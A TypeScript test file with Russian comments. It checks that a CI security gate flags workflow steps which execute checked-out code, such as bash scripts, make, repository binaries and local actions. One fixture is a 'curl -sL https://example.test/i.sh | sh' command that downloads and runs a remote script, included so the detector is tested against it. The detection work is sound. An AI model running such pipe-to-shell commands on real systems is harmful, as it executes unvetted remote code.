import { describe, it, expect } from 'vitest';
import { riskyStepsInJob, type WorkflowJob, type WorkflowStep } from './helpers/workflows';

// Дефект B10 (docs/security-audit-2026-08-08.md): «исполнение выгруженного кода»
// опознавалось по СПИСКУ известных интерпретаторов
// (`npm|npx|yarn|pnpm|astro|vite|tsx|node`). Шаг `bash ./x.sh`, `make` или
// `./bin/foo` под него не подпадал, и проверки происхождения в
// deploy-gating.test.ts остались бы зелёными над реальной уязвимостью.
//
// Проверяется СИНТЕТИЧЕСКИЙ джоб, а не реальный workflow: настоящий build-job
// защищён условием на уровне джоба, поэтому добавленный туда `bash ./x.sh`
// остался бы недостижим для форка и гейт не покраснел бы — красное не доказывало
// бы работу классификатора.

function step(index: number, fields: Partial<WorkflowStep>): WorkflowStep {
  return {
    index,
    raw: JSON.stringify(fields),
    name: fields.name,
    uses: fields.uses,
    run: fields.run,
    if: fields.if,
    with: fields.with,
    env: fields.env,
  } as WorkflowStep;
}

function job(steps: WorkflowStep[]): WorkflowJob {
  return { key: 'build', if: undefined, needs: [], steps } as unknown as WorkflowJob;
}

const CHECKOUT = { uses: 'actions/checkout@v4' };
const GUARD = { name: 'verify origin', run: 'test "$HEAD_REPO" = "$GITHUB_REPOSITORY" || exit 1' };

describe('riskyStepsInJob — исполнение после выгрузки кода', () => {
  // Общий признак, а не перечень интерпретаторов: список отстаёт от предмета молча.
  const afterCheckout: Array<[string, string]> = [
    ['bash-скрипт из репозитория', 'bash ./scripts/deploy.sh'],
    ['make', 'make build'],
    ['исполняемый файл из репозитория', './bin/check-openspec-integration'],
    ['загрузка и исполнение', 'curl -sL https://example.test/i.sh | sh'],
  ];

  for (const [label, run] of afterCheckout) {
    it(`после checkout считает исполнением: ${label}`, () => {
      const j = job([step(0, CHECKOUT), step(1, { run })]);
      const risky = riskyStepsInJob(j);
      expect(
        risky.map((s) => s.index),
        `шаг «${run}» после checkout не опознан как исполнение кода`,
      ).toContain(1);
    });
  }

  it('после checkout считает исполнением локальный action (uses: ./…)', () => {
    const j = job([step(0, CHECKOUT), step(1, { uses: './.github/actions/build' })]);
    expect(
      riskyStepsInJob(j).map((s) => s.index),
      'локальный action — это код из checkout’а, он должен считаться исполнением',
    ).toContain(1);
  });

  it('сам шаг выгрузки остаётся в списке', () => {
    const j = job([step(0, CHECKOUT), step(1, { run: 'bash ./x.sh' })]);
    expect(riskyStepsInJob(j).map((s) => s.index)).toContain(0);
  });
});

describe('riskyStepsInJob — до выгрузки кода', () => {
  // Иначе первым «опасным» станет сам guard происхождения, и проверка порядка
  // «guard раньше выгрузки» сломается на исправном workflow.
  it('guard происхождения до checkout не считается исполнением', () => {
    const j = job([step(0, GUARD), step(1, CHECKOUT)]);
    expect(
      riskyStepsInJob(j).map((s) => s.index),
      'guard до выгрузки — собственный текст workflow, чужого кода ещё нет',
    ).not.toContain(0);
  });

  it('джоб без выгрузки кода не даёт ложных срабатываний на своих run', () => {
    const j = job([step(0, GUARD), step(1, { run: 'echo hello' })]);
    expect(riskyStepsInJob(j)).toEqual([]);
  });
});
